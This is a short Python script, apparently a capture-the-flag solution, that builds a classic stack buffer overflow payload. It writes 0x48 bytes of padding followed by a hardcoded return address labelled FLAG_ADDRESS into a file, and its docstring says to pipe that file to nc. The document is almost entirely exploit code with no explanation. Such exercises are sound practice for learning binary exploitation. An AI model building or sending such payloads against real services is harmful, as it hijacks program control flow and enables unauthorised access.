"""
classic buffer overflow
pipe output file to nc
"""


FLAG_ADDRESS = 0x000000000040123b 

payload = "a" * 0x48
payload = payload.encode()
payload += int.to_bytes(FLAG_ADDRESS, byteorder="little", length=8)
with open("output", "wb") as output_file:
    output_file.write(payload)
